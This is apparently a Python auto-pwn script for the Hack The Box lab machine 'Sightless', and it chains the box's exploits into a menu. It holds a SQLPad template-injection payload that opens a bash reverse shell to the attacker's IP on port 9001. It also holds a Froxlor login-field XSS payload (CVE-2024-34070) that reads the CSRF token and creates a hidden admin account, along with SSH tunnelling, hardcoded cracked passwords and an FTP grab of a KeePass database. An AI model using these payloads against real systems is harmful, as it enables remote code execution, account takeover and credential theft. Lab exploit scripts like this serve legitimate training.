import sys, os, requests, re, subprocess, paramiko
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln
def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Sightless
    __________________________________________________________________________\n"""
    print(Fore.GREEN + f"{bnn}")


#tmsg = Fore.LIGHTMAGENTA_EX+"⇛ ["+Fore.CYAN+datetime.now().strftime("%H:%M:%S")+Fore.LIGHTMAGENTA_EX+"]"+Fore.YELLOW+"-"+Fore.LIGHTMAGENTA_EX+"["+Fore.WHITE+"P4n3l"+Fore.LIGHTMAGENTA_EX+"]"+Fore.YELLOW+"-"+Fore.LIGHTMAGENTA_EX+"["+Fore.LIGHTGREEN_EX+"~"+Fore.LIGHTMAGENTA_EX+"]"+Fore.LIGHTGREEN_EX+" ➤ "+Fore.RESET
tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] root-docker", "[+] michael", "[+] root", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.32"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://tickets.keeper.htb/");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

def enter_root_docker_user():
    
    post_url = "http://sqlpad.sightless.htb/api/test-connection"
    session = requests.Session()
    header={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }
    
    json={
        "name":"senaticonnection",
        "driver":"mysql",
        "data":{
            "host": "",
            "database":f"""{{{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{machine_ip}/9001 0>&1\"')}}}}"""
        },
        "host": "",
        "database":f"""{{{{process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/{machine_ip}/9001 0>&1\"')}}}}"""
        }
    
    session.post(post_url, headers=header, json=json)
    #print(r1.status_code)

def enter_michael_user():
    client = paramiko.SSHClient()
    host = target_machine
    username = "michael"
    password = "insaneclownposse"
    try:
        cm.sleep(.5)
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=username, password=password)
        print(tmsg,Fore.RED + f"[Exploit Message - Path] > " + Fore.YELLOW + f"Cracked Hashed michael of /etc/shadow")
        print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.GREEN + f"Hashcat cracked password > "+Fore.LIGHTBLUE_EX+"insaneclownposse")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ Successful connection")
        print(tmsg,Fore.RED + f"[Exploit Message - Connecting...] > " + Fore.LIGHTWHITE_EX + f"✔ G00d H4ch1ng Duhhmhm :3")
        #init shell
        shell = client.invoke_shell()
        while True:
            if shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
                
            command = input(f"{tmsg} ")
            if command.lower() in ["exit", "quit"]:
                print("\n[!] Closing connection...")
                break
            
            shell.send(command + "\n")
            cm.sleep(0.3)
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output, end="")
        shell.close()
        client.close()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print(tmsg,Fore.YELLOW + f"[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")

def post_user_new():
    post_url="http://admin.sightless.htb:8081/index.php?showmessage=2"
    
    session = requests.Session()
    
    header = {
        "Host": "admin.sightless.htb:8081",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "http://admin.sightless.htb:8081/index.php?showmessage=2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://admin.sightless.htb:8081",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }

    payload='loginname=admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector(\'meta[name%3d"csrf-token"]\')%3bvar+csrfToken%3dmetaTag.getAttribute(\'content\')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"http%3a//admin.sightless.htb:8080/admin_admins.php"%3bvar+params%3d"new_loginname%3dpatito%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}&password=123456&dologin='
    session.post(post_url, headers=header, data=payload, allow_redirects=302)
    #print(r1.status_code)
    
def enter_root_user():
    try:
        server = SSHTunnelForwarder(
        ('10.10.11.32', 22),
        ssh_username='michael',
        ssh_password='insaneclownposse',
        remote_bind_address=('127.0.0.1', 8080), # escucha en el puerto 8080 de la maquina atacante
        local_bind_address=('127.0.0.1', 8081) # escucha en el puerto 8081 de nuestra maquina.
        )
        server.start()
        post_user_new()
        input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Message Server] > " + Fore.WHITE + f"Press ENTER for close port forwarding")
        server.stop()
    except Exception as err: 
        print(err)
        server.stop()

def ftp_web1_connect_dwn_file(password):
    usuario = "web1"
    host = target_machine
    archivo_remoto = "/goaccess/backup/Database.kdb"
    archivo_local = "Database.kdb"
    passw = password

    cmd = f'''
    lftp -u {usuario},{passw} {host} -e "set ssl:verify-certificate no; get {archivo_remoto} -o {archivo_local}; bye"
    '''
    output = commands_send(cmd)
    if output is not None:
        print(Fore.GREEN + f"✅ Archivo descargado: {archivo_local}")
    else:
        print(Fore.RED + "❌ Error al descargar el archivo")


def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        #opcion = menu_panel()
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","root-docker connection"))
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-docker] > " + Fore.YELLOW + f"Please Listen to port 9001 for connect root-docker")
                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [root-docker] > " + Fore.WHITE + f"Press ENTER if u listen now...")
                enter_root_docker_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-docker] > " + Fore.LIGHTMAGENTA_EX + f"✔ Successful connection")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-docker] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","michael-Sightless user connection"))
                enter_michael_user(); print(ln)
            elif opcion[0] == opcion[1][2]:
                print(tmsg,hmsg("user","root-Sightless user connection"))
                print(tmsg,Fore.RED + f"[Exploit Message - Tunnel Open...] > " + Fore.CYAN + f"http://127.0.0.1:8081");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit Message - CVE-2024-34070] > " + Fore.GREEN + f"https://github.com/advisories/GHSA-x525-54hf-xr53");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit Message - Credentials Web] > " + Fore.LIGHTWHITE_EX + f"Username: patito, Password: Abcd@@1234");cm.sleep(.6)
                print(tmsg,Fore.RED + f"[Exploit Message - FTP Update Password - Path] > " + Fore.LIGHTWHITE_EX + f"http://127.0.0.1:8081/customer_ftp.php?page=accounts&action=edit&id=1")
                enter_root_user();cm.sleep(1)
                print(tmsg,Fore.RED + f"[Exploit Message - Download FTP File .kdb] > " + Fore.LIGHTWHITE_EX + f"/goaccess/backup/Database.kdb on web1 user.")
                password=input("Enter the password on web1")
                ftp_web1_connect_dwn_file(password)
                print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.LIGHTWHITE_EX + f"Cracked Hashed .kdb file")
                print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.LIGHTWHITE_EX + f"Hash password on cracked .kdb file is > "+Fore.LIGHTMAGENTA_EX+"bulldogs")
                print(tmsg,Fore.RED + f"[Exploit Message] > " + Fore.LIGHTWHITE_EX + f"Use keepassxc for see id_rsa and connect on root user.")
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
